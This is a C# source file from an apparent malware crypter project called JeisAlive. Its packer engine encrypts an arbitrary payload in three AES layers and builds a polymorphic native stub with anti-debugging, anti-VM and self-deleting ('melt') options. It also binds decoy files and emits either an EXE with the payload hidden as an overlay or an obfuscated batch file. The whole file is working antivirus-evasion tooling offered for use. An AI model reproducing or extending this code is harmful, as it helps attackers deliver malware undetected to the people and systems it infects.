using System;
using System.Collections.Generic;
using System.IO;
using JeisAlive.Models;

namespace JeisAlive.Engine
{
    public sealed class PackerEngine
    {
        public event Action<string>? Log;

        public (byte[]? exeBytes, string? batContent) Package(byte[] payloadBytes, PackerConfig config)
        {
            try
            {
                bool isExeMode = config.Format == OutputFormat.NativeExe;
                Log?.Invoke($"[*] Packer: Starting {(isExeMode ? "EXE" : "BAT")} crypter packaging...");

                // Load bound files
                var boundFiles = new List<(string name, byte[] data, byte action)>();
                if (config.BoundFiles != null && config.BoundFiles.Count > 0)
                {
                    foreach (var bf in config.BoundFiles)
                    {
                        if (!string.IsNullOrEmpty(bf.FilePath) && File.Exists(bf.FilePath))
                        {
                            byte[] fileData = File.ReadAllBytes(bf.FilePath);
                            string fileName = Path.GetFileName(bf.FilePath);
                            Log?.Invoke($"[+] Packer: Bound file loaded — {fileName} ({fileData.Length / 1024} KB, action={(int)bf.Action})");
                            boundFiles.Add((fileName, fileData, (byte)bf.Action));
                        }
                    }
                }

                bool hasBoundFiles = boundFiles.Count > 0;

                Log?.Invoke("[*] Packer: Encrypting payload (Layer 3 — AES-CBC)...");
                var (l3Encrypted, l3Key, l3Iv) = CryptoEngine.EncryptLayer3(payloadBytes);

                Log?.Invoke("[*] Packer: Generating managed entry point DLL...");
                byte[] managedDll = ManagedEntryGenerator.GenerateAndCompile(l3Iv);

                Log?.Invoke("[*] Packer: Packing Layer 2 blob...");
                byte[] l2Blob = CryptoEngine.PackLayer2Blob(l3Key, l3Iv, managedDll, boundFiles, l3Encrypted);

                Log?.Invoke("[*] Packer: Encrypting Layer 2 (AES-CBC)...");
                var (l2Encrypted, l2Key, l2Iv) = CryptoEngine.EncryptLayer2(l2Blob);

                Log?.Invoke("[*] Packer: Encrypting Layer 1 (AES-CBC, random key)...");
                byte[] l1Input = CryptoEngine.PackLayer1Input(l2Key, l2Iv, l2Encrypted);
                var (l1Encrypted, l1Salt) = CryptoEngine.EncryptLayer1(l1Input);

                int saltLen = l1Salt.Length;
                byte[] l1ForPayload = new byte[l1Encrypted.Length - saltLen];
                Buffer.BlockCopy(l1Encrypted, saltLen, l1ForPayload, 0, l1ForPayload.Length);

                Log?.Invoke("[*] Packer: Generating polymorphic native stub...");
                var stubConfig = new StubGeneratorConfig
                {
                    EncryptedBlob = Array.Empty<byte>(),
                    Salt = l1Salt,
                    AntiDebug = config.AntiDebug,
                    AntiVM = config.AntiVM,
                    HasMelt = config.MeltFile,
                    HasBoundFiles = hasBoundFiles,
                    SelfOverlay = isExeMode
                };

                string cSource = StubCodeGenerator.Generate(stubConfig);
                cSource = PolymorphicTransforms.Apply(cSource);

                Log?.Invoke("[*] Packer: Compiling native stub...");
                byte[]? nativeStub = NativeCompiler.Compile(cSource, msg => Log?.Invoke(msg));
                if (nativeStub == null)
                    return (null, null);
                Log?.Invoke($"[+] Packer: Native stub compiled ({nativeStub.Length / 1024} KB)");

                if (isExeMode)
                {
                    // EXE mode: append encrypted payload as PE overlay
                    // Format: [native exe][payload bytes][4-byte LE payload length][8-byte magic "JEISAPLD"]
                    byte[] lenBytes = BitConverter.GetBytes((uint)l1ForPayload.Length);
                    byte[] magic = System.Text.Encoding.ASCII.GetBytes("JEISAPLD");

                    byte[] finalExe = new byte[nativeStub.Length + l1ForPayload.Length + 4 + 8];
                    Buffer.BlockCopy(nativeStub, 0, finalExe, 0, nativeStub.Length);
                    Buffer.BlockCopy(l1ForPayload, 0, finalExe, nativeStub.Length, l1ForPayload.Length);
                    Buffer.BlockCopy(lenBytes, 0, finalExe, nativeStub.Length + l1ForPayload.Length, 4);
                    Buffer.BlockCopy(magic, 0, finalExe, nativeStub.Length + l1ForPayload.Length + 4, 8);

                    Log?.Invoke($"[+] Packer: EXE crypter complete ({finalExe.Length / 1024} KB)");
                    return (finalExe, null);
                }
                else
                {
                    // BAT mode: wrap in obfuscated batch file
                    Log?.Invoke("[*] Packer: Generating obfuscated batch file...");
                    string batchContent = BatchGenerator.Generate(
                        nativeStub, l1ForPayload, null, 0, config.MeltFile);

                    Log?.Invoke($"[+] Packer: BAT crypter complete ({batchContent.Length / 1024} KB)");
                    return (null, batchContent);
                }
            }
            catch (Exception ex)
            {
                Log?.Invoke($"[ERROR] Packer failed: {ex.Message}");
                return (null, null);
            }
        }
    }
}
